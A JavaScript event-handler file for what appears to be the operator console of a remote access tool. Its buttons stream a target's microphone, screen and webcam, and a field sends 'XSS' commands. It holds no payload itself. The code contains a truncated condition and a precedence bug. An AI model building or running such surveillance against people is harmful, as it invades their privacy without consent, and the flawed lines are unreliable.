
/* Set events for terminal.html */

	// Focus input field unless selecting span text
	self.addEventListener("click", async event=>{
		if (event.target.tagName != "SPAN" && event.target.tagName != "INPUT") {
			textarea.focus()
		}
	})

	// Custom keyboard handler
	self.addEventListener("keypress", async event=>{
		if (!event.ctrlKey) { // unless CTRL key is pressed

			// If nothing is focused, add new character to stdin field
			if ( 
				allowed_characters.includes(event.key) 
				&& !(
					textarea === document.activeElement 
					|| jsfield === document.activeElement
				) 
			) {
				oldValue = textarea.value
				newValue = oldValue + event.key
				textarea.value = newValue
				textarea.focus()
			}

			// Scroll to bottom on StdIn if applicable
			if (scrollOnInput) {
				if (scrollBox.scrol)
				if (!jsfield === document.activeElement) {
					scrollToBottom()
				}
			}
			if (scrollOnJsInput) {
				if (jsfield === document.activeElement) {
					scrollToBottom()
				}
			}

			// Terminal controls
			if (event.keyCode == 13) { // Enter
				if ( textarea === document.activeElement ) {
					event.preventDefault()
					onCommand()
				}
				if ( jsfield === document.activeElement ) {
					event.preventDefault()
					onXSSCommand()
				}
				cmd_current = ""
			} else if (event.keyCode == "38") { // Up arrow
				if (cmd_history_i < cmd_history.length) {
					textarea.value = cmd_history[cmd_history_i]
					cmd_history_i += 1
				}
				textarea.focus()
			} else if (event.keyCode == "40") { // Down arrow
				if (cmd_history_i > 0) {
					cmd_history_i -= 1
					textarea.value = cmd_history[cmd_history_i]
				} else {
					textarea.value = cmd_current
				}
				textarea.focus()
			} else {
				cmd_current = textarea.value
			}

		}
	})

	// Open new window button
	document.querySelector("html body div.menu div.item[name=newwindow]").addEventListener("click", async()=>{
		self.open("../../terminal.html?fixthis", "root@fixthis - TAB" + Math.floor( (Math.random() * 9999) + 1), "menubar=no,location=no,resizable=yes,scrollbars=no,status=yes")
	})

	// Clear button
	document.querySelector("html body div.menu div.item[name=clear]").addEventListener("click", async()=>{
		clear()
	})

	// Select all button
	document.querySelector("html body div.menu div.item[name=selectall]").addEventListener("click", async()=>{
		textarea.value =  terminal.text()
		textarea.select()
	})

	// Stream microphone button
	document.querySelector("html body div.menu div.item[name=streammic]").addEventListener("click", async()=>{
		print(request_tag + "<span title='" + timestamp() + "'>Streaming microphone at " + mic_bitrate +  "bps...</span>")
		streamMic(mic_bitrate)
	})

	// Stream monitor button
	document.querySelector("html body div.menu div.item[name=streammon]").addEventListener("click", async()=>{
		print(request_tag + "<span title='" + timestamp() + "'>Streaming monitor at a resolution of " + mon_resolution + " pixels at " + mon_bitrate + "bps...</span>")
		streamMon(mon_bitrate, mon_resolution)
	})

	// Stream webcam button
	document.querySelector("html body div.menu div.item[name=streamcam]").addEventListener("click", async()=>{
		print(request_tag + "<span title='" + timestamp() + "'>Streaming webcam at a resolution of " + cam_resolution + " pixels at " + cam_bitrate + "bps...</span>")
		streamCam(cam_bitrate, cam_resolution)
	})

	// End all streams button
	document.querySelector("html body div.menu div.item[name=endallstreams]").addEventListener("click", async()=>{
		print(request_tag + "<span title='" + timestamp() + "'>Ending all streams...</span>")
		stdIn("ENDALLSTREAMS")
		$("html body div.menu div.item").find("div.rec.blinking").parent().parent().remove()
	})

	shrinkInputField = async () => {
		form.style.height = "calc(100vh - " + scrollBox.getBoundingClientRect().height + "px)"
	}

	// Window resize handler
	$(window).resize(async()=>{
		setTimeout(resetClearBreaks(), 100)
		shrinkInputField()
	})

	// Handle ajax errors
	$(document).ajaxError(async data=>{
		console.log(data)
	})

	// Warn before quit
	if (warnBeforeClose) {
		self.onbeforeunload = async e => {
			return "Close?"
		}
	}
